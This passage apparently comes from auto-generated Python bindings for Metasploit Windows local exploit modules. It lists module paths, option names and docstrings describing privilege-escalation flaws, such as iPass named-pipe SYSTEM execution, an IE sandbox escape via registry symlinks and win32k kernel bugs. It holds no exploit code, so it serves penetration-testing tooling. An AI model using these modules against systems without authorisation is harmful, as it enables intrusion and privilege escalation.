        installations of Vista-Win8. It requires an insecure bin path to plant the DLL payload.
      
		"""

		path = 'windows/local/ikeext_service'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			FileDropperDelay = 'FileDropperDelay'
			DIR = 'DIR'

	class windows_local_ipass_launch_app(object):
		"""
		
        The named pipe, /IPEFSYSPCPIPE, can be accessed by normal users to interact
        with the iPass service. The service provides a LaunchAppSysMode command which
        allows to execute arbitrary commands as SYSTEM.
      
		"""

		path = 'windows/local/ipass_launch_app'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			FileDropperDelay = 'FileDropperDelay'
			WritableDir = 'WritableDir'

	class windows_local_ms13_097_ie_registry_symlink(object):
		"""
		
        This module exploits a vulnerability in Internet Explorer Sandbox which allows to
        escape the Enhanced Protected Mode and execute code with Medium Integrity. The
        vulnerability exists in the IESetProtectedModeRegKeyOnly function from the ieframe.dll
        component, which can be abused to force medium integrity IE to user influenced keys.
        By using registry symlinks it's possible force IE to add a policy entry in the registry
        and finally bypass Enhanced Protected Mode.
      
		"""

		path = 'windows/local/ms13_097_ie_registry_symlink'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'
			required_Powershell_persist = 'Powershell::persist'
			Powershell_prepend_sleep = 'Powershell::prepend_sleep'
			required_Powershell_strip_comments = 'Powershell::strip_comments'
			required_Powershell_strip_whitespace = 'Powershell::strip_whitespace'
			required_Powershell_sub_vars = 'Powershell::sub_vars'
			required_Powershell_sub_funcs = 'Powershell::sub_funcs'
			required_Powershell_exec_in_place = 'Powershell::exec_in_place'
			required_Powershell_encode_final_payload = 'Powershell::encode_final_payload'
			required_Powershell_encode_inner_payload = 'Powershell::encode_inner_payload'
			required_Powershell_use_single_quotes = 'Powershell::use_single_quotes'
			required_Powershell_no_equals = 'Powershell::no_equals'
			required_Powershell_method = 'Powershell::method'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			required_DELAY = 'DELAY'

	class windows_local_ms15_051_client_copy_image(object):
		"""
		
        This module exploits improper object handling in the win32k.sys kernel mode driver.
        This module has been tested on vulnerable builds of Windows 7 x64 and x86, and
        Windows 2008 R2 SP1 x64.
      
		"""

		path = 'windows/local/ms15_051_client_copy_image'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'

	class windows_local_ppr_flatten_rec(object):
		"""
		
          This module exploits a vulnerability on EPATHOBJ::pprFlattenRec due to the usage
        of uninitialized data which allows to corrupt memory. At the moment, the module has
        been tested successfully on Windows XP SP3, Windows 2003 SP1, and Windows 7 SP1.
      
		"""

		path = 'windows/local/ppr_flatten_rec'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'
			required_WAIT = 'WAIT'

	class windows_local_powershell_remoting(object):
		"""
		
            This module uses Powershell Remoting (TCP 47001) to inject payloads on target machines.
          If RHOSTS are specified, it will try to resolve the IPs to hostnames, otherwise
          use a HOSTFILE to supply a list of known hostnames.
          
		"""

		path = 'windows/local/powershell_remoting'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'
			required_Powershell_persist = 'Powershell::persist'
			Powershell_prepend_sleep = 'Powershell::prepend_sleep'
			required_Powershell_strip_comments = 'Powershell::strip_comments'
			required_Powershell_strip_whitespace = 'Powershell::strip_whitespace'
			required_Powershell_sub_vars = 'Powershell::sub_vars'
			required_Powershell_sub_funcs = 'Powershell::sub_funcs'
			required_Powershell_exec_in_place = 'Powershell::exec_in_place'
			required_Powershell_encode_final_payload = 'Powershell::encode_final_payload'
			required_Powershell_encode_inner_payload = 'Powershell::encode_inner_payload'
			required_Powershell_use_single_quotes = 'Powershell::use_single_quotes'
			required_Powershell_no_equals = 'Powershell::no_equals'
			required_Powershell_method = 'Powershell::method'
			SMBUser = 'SMBUser'
			SMBPass = 'SMBPass'
			SMBDomain = 'SMBDomain'
			RHOSTS = 'RHOSTS'
			HOSTFILE = 'HOSTFILE'
			ReverseListenerComm = 'ReverseListenerComm'
			required_ExitOnSession = 'ExitOnSession'
			ListenerTimeout = 'ListenerTimeout'
